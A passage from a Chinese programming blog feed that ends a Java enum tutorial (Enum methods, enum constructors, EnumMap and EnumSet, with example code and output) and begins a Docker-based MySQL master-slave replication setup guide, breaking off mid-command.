class="hljs">蓝色<br></code></pre></td></tr></table></figure><h2 id="values-ordinal-valueOf-和compareTo-方法"><a href="#values-ordinal-valueOf-和compareTo-方法" class="headerlink" title="values(), ordinal() , valueOf()和compareTo() 方法"></a>values(), ordinal() , valueOf()和compareTo() 方法</h2><p>enum 定义的枚举类默认继承了 java.lang.Enum 类，并实现了 java.lang.Serializable 和 java.lang.Comparable 两个接口。</p><p>Java 中的每一个枚举都继承自 java.lang.Enum 类。当定义一个枚举类型时，每一个枚举类型成员都可以看作是 Enum 类的实例，这些枚举成员默认都被 final、public, static 修饰，当使用枚举类型成员时，直接使用枚举名称调用成员即可。</p><p>所有枚举实例都可以调用 Enum 类的方法，常用方法如表 1 所示。</p><table><thead><tr><th>方法名称</th><th>描述</th></tr></thead><tbody><tr><td>values()</td><td>以数组形式返回枚举类型的所有成员</td></tr><tr><td>valueOf()</td><td>将普通字符串转换为枚举实例</td></tr><tr><td>compareTo()</td><td>比较两个枚举成员在定义时的顺序</td></tr><tr><td>ordinal()</td><td>获取枚举成员的索引位置</td></tr></tbody></table><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestEnum</span> &#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> &#123;<br>        <span class="hljs-comment">//定义一个枚举</span><br>        RED, GREEN, BLUE;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 调用 values()</span><br>        Color[] arr = Color.values();<br><br>        <span class="hljs-comment">// 迭代枚举</span><br>        <span class="hljs-keyword">for</span> (Color col : arr) &#123;<br>            <span class="hljs-comment">// 查看索引</span><br>            System.out.println(col + <span class="hljs-string">&quot; at index &quot;</span> + col.ordinal());<br>        &#125;<br><br>        <span class="hljs-comment">// 使用 valueOf() 返回枚举常量，不存在的会报错 IllegalArgumentException</span><br>        System.out.println(Color.valueOf(<span class="hljs-string">&quot;RED&quot;</span>));<br>        System.out.println(Color.valueOf(<span class="hljs-string">&quot;BLUE&quot;</span>));<br>        compare(Color.valueOf(<span class="hljs-string">&quot;GREEN&quot;</span>));<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Color s)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; Color.values().length; i++) &#123;<br>            <span class="hljs-comment">//调用compareTo()比较</span><br>            System.out.println(s + <span class="hljs-string">&quot;与&quot;</span> + Color.values()[i] + <span class="hljs-string">&quot;的比较结果是：&quot;</span> + s.compareTo(Color.values()[i]));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>果为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RED</span> at index <span class="hljs-number">0</span><br><span class="hljs-attribute">GREEN</span> at index <span class="hljs-number">1</span><br><span class="hljs-attribute">BLUE</span> at index <span class="hljs-number">2</span><br><span class="hljs-attribute">RED</span><br><span class="hljs-attribute">BLUE</span><br><span class="hljs-attribute">GREEN</span>与RED的比较结果是：<span class="hljs-number">1</span><br><span class="hljs-attribute">GREEN</span>与GREEN的比较结果是：<span class="hljs-number">0</span><br><span class="hljs-attribute">GREEN</span>与BLUE的比较结果是：-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="枚举类成员"><a href="#枚举类成员" class="headerlink" title="枚举类成员"></a>枚举类成员</h2><p>枚举跟普通类一样可以用自己的变量、方法和构造函数，构造函数只能使用 private 访问修饰符，所以外部无法调用。</p><p>枚举既可以包含具体方法，也可以包含抽象方法。 如果枚举类具有抽象方法，则枚举类的每个实例都必须实现它。</p><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>&#123;<br>    RED, GREEN, BLUE;<br> <br>    <span class="hljs-comment">// 构造函数</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Color</span><span class="hljs-params">()</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Constructor called for : &quot;</span> + <span class="hljs-built_in">this</span>.toString());<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">colorInfo</span><span class="hljs-params">()</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Universal Color&quot;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span><br>&#123;    <br>    <span class="hljs-comment">// 输出</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        <span class="hljs-type">Color</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Color.RED;<br>        System.out.println(c1);<br>        c1.colorInfo();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span> <span class="hljs-title">for</span> :</span> RED<br><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span> <span class="hljs-title">for</span> :</span> GREEN<br><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span> <span class="hljs-title">for</span> :</span> BLUE<br>RED<br>Universal Color<br></code></pre></td></tr></table></figure><h2 id="为枚举添加方法"><a href="#为枚举添加方法" class="headerlink" title="为枚举添加方法"></a>为枚举添加方法</h2><p>Java 为枚举类型提供了一些内置的方法，同时枚举常量也可以有自己的方法。此时要注意必须在枚举实例的最后一个成员后添加分号，而且必须先定义枚举实例。</p><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">WeekDay</span> &#123;<br>    <span class="hljs-comment">//以上是枚举的成员，必须先定义，而且使用分号结束</span><br>    Mon(<span class="hljs-string">&quot;Monday&quot;</span>), Tue(<span class="hljs-string">&quot;Tuesday&quot;</span>), Wed(<span class="hljs-string">&quot;Wednesday&quot;</span>), Thu(<span class="hljs-string">&quot;Thursday&quot;</span>), Fri(<span class="hljs-string">&quot;Friday&quot;</span>), Sat(<span class="hljs-string">&quot;Saturday&quot;</span>), Sun(<span class="hljs-string">&quot;Sunday&quot;</span>);<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String day;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">WeekDay</span><span class="hljs-params">(String day)</span> &#123;<br>        <span class="hljs-built_in">this</span>.day = day;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printDay</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (i) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                System.out.println(WeekDay.Mon);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                System.out.println(WeekDay.Tue);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                System.out.println(WeekDay.Wed);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                System.out.println(WeekDay.Thu);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                System.out.println(WeekDay.Fri);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                System.out.println(WeekDay.Sat);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                System.out.println(WeekDay.Sun);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;wrong number!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDay</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> day;<br>    &#125;<br>&#125;<br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (WeekDay day : WeekDay.values()) &#123;<br>        System.out.println(day + <span class="hljs-string">&quot;====&gt;&quot;</span> + day.getDay());<br>    &#125;<br>    WeekDay.printDay(<span class="hljs-number">5</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Mon</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Monday<br><span class="hljs-attribute">Tue</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Tuesday<br><span class="hljs-attribute">Wed</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Wednesday<br><span class="hljs-attribute">Thu</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Thursday<br><span class="hljs-attribute">Fri</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Friday<br><span class="hljs-attribute">Sat</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Saturday<br><span class="hljs-attribute">Sun</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Sunday<br>Fri<br></code></pre></td></tr></table></figure><blockquote><p>Java 中的 enum 还可以跟 Class 类一样覆盖基类的方法。</p></blockquote><h2 id="EnumMap-与-EnumSet"><a href="#EnumMap-与-EnumSet" class="headerlink" title="EnumMap 与 EnumSet"></a>EnumMap 与 EnumSet</h2><p>为了更好地支持枚举类型，java.util 中添加了两个新类：EnumMap 和 EnumSet。使用它们可以更高效地操作枚举类型。</p><h3 id="EnumMap-类"><a href="#EnumMap-类" class="headerlink" title="EnumMap 类"></a>EnumMap 类</h3><p>EnumMap 是专门为枚举类型量身定做的 Map 实现。虽然使用其他的 Map（如 HashMap）实现也能完成枚举类型实例到值的映射，但是使用 EnumMap 会更加高效。</p><p>HashMap 只能接收同一枚举类型的实例作为键值，并且由于枚举类型实例的数量相对固定并且有限，所以 EnumMap 使用数组来存放与枚举类型对应的值，使得 EnumMap 的效率非常高。</p><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DataBaseType</span> &#123;<br>    <span class="hljs-comment">//定义数据库类型枚举</span><br>    DB2,MYSQL,ORACLE,SQLSERVER<br>&#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> &#123;<br>         EnumMap&lt;DataBaseType,String&gt; urls=<span class="hljs-keyword">new</span> <span class="hljs-title class_">EnumMap</span>&lt;DataBaseType,String&gt;(DataBaseType.class);<br>        urls.put(DataBaseType.DB2,<span class="hljs-string">&quot;jdbc:db2://localhost:5000/sample&quot;</span>);<br>        urls.put(DataBaseType.MYSQL,<span class="hljs-string">&quot;jdbc:mysql://localhost/mydb&quot;</span>);<br>        urls.put(DataBaseType.ORACLE,<span class="hljs-string">&quot;jdbc:oracle:thin:@localhost:1521:sample&quot;</span>);<br>        urls.put(DataBaseType.SQLSERVER,<span class="hljs-string">&quot;jdbc:microsoft:sqlserver://sql:1433;Database=mydb&quot;</span>);<br>        System.out.println(urls.get(DataBaseType.DB2));<br>        System.out.println(urls.get(DataBaseType.SQLSERVER));<br>    &#125;<br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">jdbc:db2:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">5000</span>/sample<br>jdbc:microsoft:sqlserver:<span class="hljs-regexp">//</span>sql:<span class="hljs-number">1433</span>;Database=mydb<br></code></pre></td></tr></table></figure><h3 id="EnumSet-类"><a href="#EnumSet-类" class="headerlink" title="EnumSet 类"></a>EnumSet 类</h3><p>EnumSet 是枚举类型的高性能 Set 实现，它要求放入它的枚举常量必须属于同一枚举类型。EnumSet 提供了许多工厂方法以便于初始化。</p><p>EnumSet 类的常用方法</p><table><thead><tr><th>方法名称</th><th>描述</th></tr></thead><tbody><tr><td>allOf(Class element type)</td><td>创建一个包含指定枚举类型中所有枚举成员的 EnumSet 对象</td></tr><tr><td>complementOf(EnumSet s)</td><td>创建一个与指定 EnumSet 对象 s 相同的枚举类型 EnumSet 对象，并包含所有 s 中未包含的枚举成员</td></tr><tr><td>copyOf(EnumSet s)</td><td>创建一个与指定 EnumSet 对象 s 相同的枚举类型 EnumSet 对象，并与 s 包含相同的枚举成员</td></tr><tr><td>noneOf(&lt;Class elementType)</td><td>创建指定枚举类型的空 EnumSet 对象</td></tr><tr><td>of(E first,e…rest)</td><td>创建包含指定枚举成员的 EnumSet 对象</td></tr><tr><td>range(E from ,E to)</td><td>创建一个 EnumSet 对象，该对象包含了 from 到 to 之间的所有枚举成员</td></tr></tbody></table><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test4</span><span class="hljs-params">()</span> &#123;<br>       EnumMap&lt;DataBaseType,String&gt; urls=<span class="hljs-keyword">new</span> <span class="hljs-title class_">EnumMap</span>&lt;DataBaseType,String&gt;(DataBaseType.class);<br>       urls.put(DataBaseType.DB2,<span class="hljs-string">&quot;jdbc:db2://localhost:5000/sample&quot;</span>);<br>       urls.put(DataBaseType.MYSQL,<span class="hljs-string">&quot;jdbc:mysql://localhost/mysql&quot;</span>);<br>       urls.put(DataBaseType.ORACLE,<span class="hljs-string">&quot;jdbc:oracle:thin:@localhost:1521:sample&quot;</span>);<br>       urls.put(DataBaseType.SQLSERVER,<span class="hljs-string">&quot;jdbc:microsoft:sqlserver://sql:1433;Database=mydb&quot;</span>);<br><br>       <span class="hljs-keyword">for</span> (DataBaseType baseType : EnumSet.range(DataBaseType.MYSQL, DataBaseType.ORACLE)) &#123;<br>           System.out.println(urls.get(baseType));<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">jdbc:</span>mysql:<span class="hljs-comment">//localhost/mysql</span><br><span class="hljs-symbol">jdbc:</span>oracle:thin:@localhost:<span class="hljs-number">1521</span>:sample<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>basis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从零开始，通过docker实现MySQL主从复制</title>
    <link href="/2022/11/27/%E9%80%9A%E8%BF%87docker%E5%AE%9E%E7%8E%B0MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <url>/2022/11/27/%E9%80%9A%E8%BF%87docker%E5%AE%9E%E7%8E%B0MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="从零开始，通过docker实现mysql-主从复制"><a href="#从零开始，通过docker实现mysql-主从复制" class="headerlink" title="从零开始，通过docker实现mysql 主从复制"></a>从零开始，通过docker实现mysql 主从复制</h1><h2 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h2><p> 很简单，命令：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y docker<br></code></pre></td></tr></table></figure><p>启动docker:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">systemctl start docker //centos7及以后版本<br><br># service docker start //centos6及之前的版本<br></code></pre></td></tr></table></figure><p>查看镜像</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker images<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127204452372.png" alt="image-20221127204452372"></p><p>创建docker 容器（可以根据一个镜像创建多个容器）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker run -tid 镜像ID/usr/sbin/init  //centos7版本。使用/usr/sbin/init解决systemctl报错不能使用的问题<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -tid 镜像ID<span class="hljs-regexp">/bin/</span>bash     <span class="hljs-regexp">//</span>非centos7<br></code></pre></td></tr></table></figure><p>查看容器列表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker ps -a<br></code></pre></td></tr></table></figure><p>退出容器</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>进入容器</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker exec -it 容器名称 /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127204853468.png" alt="image-20221127204853468"></p><p>进入容器后，注意变化，之前是root@localhst，现在变成root@容器id，也就是容器ID，现在进入容器后，你可以理解成，一个全新的linux操作系统，就像我们wondow下安装VMware Workstation后，成功通过镜像安装一台linux的道理是样的！你在容器的干什么，装什么不会影响到宿主，两个操作系统是隔离的，独立的。</p><h2 id="2-使用docker安装MySQL"><a href="#2-使用docker安装MySQL" class="headerlink" title="2.使用docker安装MySQL"></a>2.使用docker安装MySQL</h2><ol><li>在docker hub 上查看要下载的mysql镜像名称:<br>打开<a href="https://registry.hub.docker.com/">dockerHub官网地址</a> 在上方搜索栏里输入mysql</li></ol><p>不指定版本号，默认下载最新版本:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo docker pull mysql</span><br></code></pre></td></tr></table></figure><p>指定版本号:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> docker pull mysql:<span class="hljs-number">5</span>.<span class="hljs-number">7</span>。<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>如果下载太慢的话，我这里提供<a href="https://pan.baidu.com/s/10hiDEDnxNovqzhXdrRnPEg?pwd=283l">MySQLtar包</a><br>在将mysql.tar文件上传到虚拟机，通过load命令加载为镜像</p><p><code>docker load -i nginx.tar</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127205803009.png" alt="image-20221127205803009"></p><ol start="2"><li><p>镜像加载完成之后，用该镜像创建mysql实例,使用下面的命令来创建</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo docker run -d -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> -v <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>conf:<span class="hljs-regexp">/etc/my</span>sql<span class="hljs-regexp">/conf.d -v /u</span>sr<span class="hljs-regexp">/local/my</span>sql<span class="hljs-regexp">/data:/</span>var<span class="hljs-regexp">/lib/my</span>sql -e MYSQL_ROOT_PASSWORD=root --name  mysql mysql:<span class="hljs-number">5.7</span>.<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><blockquote><p>配置端口映射：</p></blockquote><p>-p 3306:3306 –name mysql<br>将容器的3306端口映射到主机的3306端口</p><blockquote><p>配置mysql数据卷挂载</p></blockquote><ol><li>-v &#x2F;mydata&#x2F;mysql&#x2F;log:&#x2F;var&#x2F;log&#x2F;mysql(日志文件挂载)<br>将容器中的日志文件夹挂载到主机对应的&#x2F;var&#x2F;log&#x2F;mysql文件夹中</li><li>-v &#x2F;mydata&#x2F;mysql&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql(数据文件挂载)<br>将容器中的数据文件夹挂载到主机对应的&#x2F;var&#x2F;lib&#x2F;mysql文件夹中</li><li>-v &#x2F;mydata&#x2F;mysql&#x2F;conf:&#x2F;etc&#x2F;mysql(配置文件挂载)<br>将容器的配置文件夹挂载到主机对应的&#x2F;etc&#x2F;mysql文件夹中<br>注(这里所提的主机指的是当前的linux主机)</li></ol><blockquote><p>配置用户</p></blockquote><p>​-e MYSQL_ROOT_PASSWORD&#x3D;root<br>​设置初始化root用户的密码</p><blockquote><p>指定镜像资源 </p></blockquote><ol><li>-d mysql:5.7.25</li><li>-d：以后台方式运行实例</li><li>mysql:5.7.25：指定用这个镜像来创建运行实例</li></ol></li></ol><p><code>docker ps -a</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127210618489.png" alt="image-20221127210618489"></p><h2 id="3-主服务器搭建"><a href="#3-主服务器搭建" class="headerlink" title="3.主服务器搭建"></a>3.主服务器搭建</h2><h3 id="3-1-新建mysql-master容器实例3307"><a href="#3-1-新建mysql-master容器实例3307" class="headerlink" title="3.1 新建mysql-master容器实例3307"></a>3.1 新建mysql-master容器实例3307</h3><pre><code class="hljs"># 创建master、slave配置文件所在文件夹mkdir -p /usr/local/repository/mysql/mysql-master/confmkdir -p /usr/local/repository/mysql/mysql-slave/conf# 创建主容器实例docker run -p 3307:3306 --name mysql-master -v /usr/local/repository/mysql/mysql-master/log:/var/log/mysql -v /usr/local/repository/mysql/mysql-master/data:/var/lib/mysql -v /usr/local/repository/mysql/mysql-master/conf:/etc/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7.25</code></pre><h3 id="3-2-主服务器mysql-master添加并修改配置文件my-cnf"><a href="#3-2-主服务器mysql-master添加并修改配置文件my-cnf" class="headerlink" title="3.2 主服务器mysql-master添加并修改配置文件my.cnf"></a>3.2 主服务器mysql-master添加并修改配置文件my.cnf</h3><pre><code class="hljs"># 编辑配置文件内容vim /usr/local/repository/mysql/mysql-master/conf/my.cnf</code></pre><p>配置文件内容如下：</p><pre><code class="hljs">[client]default_character_set=utf8[mysqld]collation_server = utf8_general_cicharacter_set_server = utf8## 设置server_id，同一局域网中需要唯一server_id=101 ## 指定不需要同步的数据库名称binlog-ignore-db=mysql  ## 开启二进制日志功能log-bin=mall-mysql-bin  ## 设置二进制日志使用内存大小（事务）binlog_cache_size=1M  ## 设置使用的二进制日志格式（mixed,statement,row）binlog_format=mixed  ## 二进制日志过期清理时间。默认值为0，表示不自动清理。expire_logs_days=7  ## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致slave_skip_errors=1062</code></pre><h3 id="3-3-添加完之后重启mysql-master容器"><a href="#3-3-添加完之后重启mysql-master容器" class="headerlink" title="3.3 添加完之后重启mysql-master容器"></a>3.3 添加完之后重启mysql-master容器</h3><pre><code class="hljs">docker restart mysql-master</code></pre><h3 id="3-4-进入mysql-master容器"><a href="#3-4-进入mysql-master容器" class="headerlink" title="3.4 进入mysql-master容器"></a>3.4 进入mysql-master容器</h3><pre><code class="hljs">docker exec -it mysql-master /bin/bashmysql -uroot -proot</code></pre><h3 id="3-5-master容器实例内创建数据同步用户"><a href="#3-5-master容器实例内创建数据同步用户" class="headerlink" title="3.5 master容器实例内创建数据同步用户"></a>3.5 master容器实例内创建数据同步用户</h3><pre><code class="hljs">CREATE USER &#39;slave&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39;;GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#39;slave&#39;@&#39;%&#39;;</code></pre><h2 id="4-从服务器搭建"><a href="#4-从服务器搭建" class="headerlink" title="4.从服务器搭建"></a>4.从服务器搭建</h2><h3 id="4-1-创建mysql从服务器容器实例"><a href="#4-1-创建mysql从服务器容器实例" class="headerlink" title="4.1 创建mysql从服务器容器实例"></a>4.1 创建mysql从服务器容器实例</h3><pre><code class="hljs">docker run -p 3308:3306 --name mysql-slave -v /usr/local/repository/mysql/mysql-slave/log:/var/log/mysql -v /usr/local/repository/mysql/mysql-slave/data:/var/lib/mysql -v /usr/local/repository/mysql/mysql-slave/conf:/etc/mysql -e 